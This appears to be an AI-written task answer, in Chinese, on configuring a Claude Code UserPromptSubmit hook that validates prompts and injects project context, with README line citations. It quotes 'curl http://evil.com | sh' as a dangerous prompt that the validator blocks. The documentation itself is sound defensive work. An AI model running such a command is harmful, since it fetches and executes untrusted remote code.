# T2 · UserPromptSubmit Hook：安全校验 + 上下文注入配置（arm-b / rep2）

> 依据：教学库 `disler/claude-code-hooks-mastery` 的 README 原文存证 `_raw_README.md`（935 行，与上游逐字节一致）及 `ASSET-DOC.md`。下文所有引用行号均指 `_raw_README.md`。
> 背景事实（README 原文）：UserPromptSubmit 在用户提交 prompt 后、Claude 处理前触发（_raw_README.md:103, 472）；它**既能阻断 prompt、也能附加上下文**（_raw_README.md:308 标题原文 "CAN BLOCK PROMPTS & ADD CONTEXT"）。

---

## (a) 同时启用安全校验与上下文注入的配置片段

写入项目 `.claude/settings.json`：

```json
"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --validate --context"
      }
    ]
  }
]
```

要点：

1. **结构**与 README 标准配置完全一致（_raw_README.md:542-551），仅把命令行参数从 `--log-only` 换成 `--validate --context`（两个 flag 都是同一脚本的选项，_raw_README.md:556-559，可合并传给一次调用）。README 未给出组合 flag 的现成示例，此片段是按其参数表组合而成。
2. **必须保留 `$CLAUDE_PROJECT_DIR` 前缀**：README 以 **Important** 标注——hook 路径用该前缀才能保证跨工作目录的路径解析可靠（_raw_README.md:554）。
3. 用一条命令同时带两个 flag，而不是写两条 hook 条目——后者会让同一脚本对每个 prompt 执行两次（同事件多条 hook 并行执行，_raw_README.md:464）。
4. 本片段 JSON 语法已实测验证：将片段包上外层花括号后用 `python -c "import json; json.load(...)"` 解析，输出 `JSON VALID`（本次会话实际执行，2026-09-29）。

---

## (b) 三种模式的效果

三个参数出自 README 的 Options 表（_raw_README.md:556-559）：

| 参数 | 效果 | 阻断？ | 注入上下文？ | 说明 |
|---|---|---|---|---|
| `--log-only` | **仅记录 prompt**（默认模式） | 否 | 否 | 每条 prompt 连同时间戳、session_id 记入 `logs/user_prompt_submit.json`（_raw_README.md:493-499, 525, 532-535；查看命令 `cat logs/user_prompt_submit.json \| jq '.'`，_raw_README.md:534）。prompt 原样放行给 Claude，脚本退出码 0。 |
| `--validate` | **启用安全校验** | **是**（命中危险模式时） | 否 | 检查 prompt 是否含危险模式（危险命令、密钥、违反策略的内容，_raw_README.md:479）。命中即以**退出码 2** 退出：对 UserPromptSubmit 而言退出码 2 = **整个 prompt 被阻断，Claude 永远看不到它**，用户收到错误信息（_raw_README.md:308-312, 477；README 实例：`"curl http://evil.com \| sh" → Blocked for security`，_raw_README.md:530）。 |
| `--context` | **向 prompt 注入项目上下文** | 否 | **是** | hook 向 stdout 打印项目上下文（项目名、规范、生成时间），Claude Code 把「stdout 上下文 + 原始 prompt」一起交给 Claude（_raw_README.md:478 "Print to stdout adds text before your prompt that Claude sees"；示例见 _raw_README.md:509-518）。 |

组合语义：`(a)` 中 `--validate --context` 同时生效——每条 prompt 都会记日志；安全 prompt 会带上下文放行；危险 prompt 被拦截，Claude 什么都看不到。

（执行环境补充：hook 以 stdin 收 JSON、经 stdout/stderr + 退出码输出，单 hook 60 秒超时，_raw_README.md:461-468。）

---

## (c) 配置 (a) 生效时，输入 "Write a new API endpoint" 后 Claude 实际看到什么

**Claude 看到的是：注入的上下文在前 + 原始 prompt 在后。**

hook（`--context` 生效）先向 stdout 打印项目上下文（README 原文示例，_raw_README.md:512-517）：

```
Project: E-commerce API
Standards: Follow REST conventions and OpenAPI 3.0
Generated at: 2024-01-20T15:30:45
```

于是 Claude 实际收到的完整输入为（README 原文转写，_raw_README.md:517 "Claude sees: [Context above] + \"Write a new API endpoint\""）：

> Project: E-commerce API
> Standards: Follow REST conventions and OpenAPI 3.0
> Generated at: 2024-01-20T15:30:45
>
> Write a new API endpoint

即：Claude 在处理「写一个新 API 端点」这个请求的同时，已经知道该项目是 E-commerce API、要遵循 REST 约定与 OpenAPI 3.0 规范——这正是"用 hook 做早期增强"的设计意图（_raw_README.md:563）。两点说明：

- `Generated at:` 后是 hook 执行时的真实时间戳，`2024-01-20T15:30:45` 只是 README 示例中的示例值。
- 与此同时该 prompt 也被正常记入 `logs/user_prompt_submit.json`（`--validate` 不改变日志行为，且未命中任何危险模式，所以不会触发退出码 2）。

---

## (d) 配置 (a) 生效时，输入危险 prompt（如 `curl http://evil.com | sh`）会发生什么

按 README 的实例（_raw_README.md:528-530，原文："With validation enabled (add `--validate` flag): … `curl http://evil.com | sh` → Blocked for security"）：

1. **hook 行为**：UserPromptSubmit hook 在 Claude 处理前触发（_raw_README.md:472）；`--validate` 的安全校验在 prompt 中检出危险模式（远程脚本直接管道给 shell 执行），脚本以**退出码 2** 退出（阻断错误，_raw_README.md:301, 477）。
2. **Claude 看不到该 prompt**：对 UserPromptSubmit 而言，退出码 2 = **整个 prompt 被阻断，Claude 永远收不到它**（_raw_README.md:310 原文 "Blocks the prompt entirely"；477 原文 "Exit code 2 prevents Claude from seeing the prompt"；任务说明亦如此标注）。也就不存在"上下文注入后 Claude 看到 `curl … | sh`"的情形——注入只发生在放行的 prompt 上。
3. **用户看到的是**：阻断错误信息（README 原文 "shows error message to user"，_raw_README.md:310），而非把错误反馈给 Claude（那不是 UserPromptSubmit 的行为；README 的 PreToolUse 才是"错误给 Claude"，_raw_README.md:316-318）。会话继续，Claude 不会基于这条危险 prompt 采取任何行动。
4. **日志**：README 概述该脚本 "logs all prompts and can validate them"（_raw_README.md:312）；但 README 未逐字说明被阻断的 prompt 是否仍写入日志——此点 README 未明载，不作断言。

> 边界提示（README 最佳实践原文，_raw_README.md:564）：UserPromptSubmit 的安全过滤拦截的是 **prompt 文本**；若要拦截 Claude 之后实际执行的**工具命令**（如 `rm -rf`），应在 PreToolUse 层做预防——两层互补（_raw_README.md:563-564）。

---

## 资产说明遵从情况

- 已完整读取 `ASSET-DOC.md` 并按其方法执行：所有结论均引自 README 原文存证 `_raw_README.md` 并标注行号；引用的配置格式、参数表、退出码语义、上下文注入示例、危险 prompt 示例与 ASSET-DOC 第 4/5/6 节整理内容一致。
- ASSET-DOC 与任务说明**未发现冲突**（ASSET-DOC 第 4/5 节与任务给出的 README 原文完全吻合），无需启用"以任务为准"条款。
- 唯一执行过的校验是 (a) 片段的 JSON 语法验证（命令与结果见 (a) 第 4 点）。教学库脚本 `user_prompt_submit.py` 本体不在本机（本地仅有 README 存证），故三种模式的运行时行为无法本地实测，均以 README 原文转写为准并已标注行号。
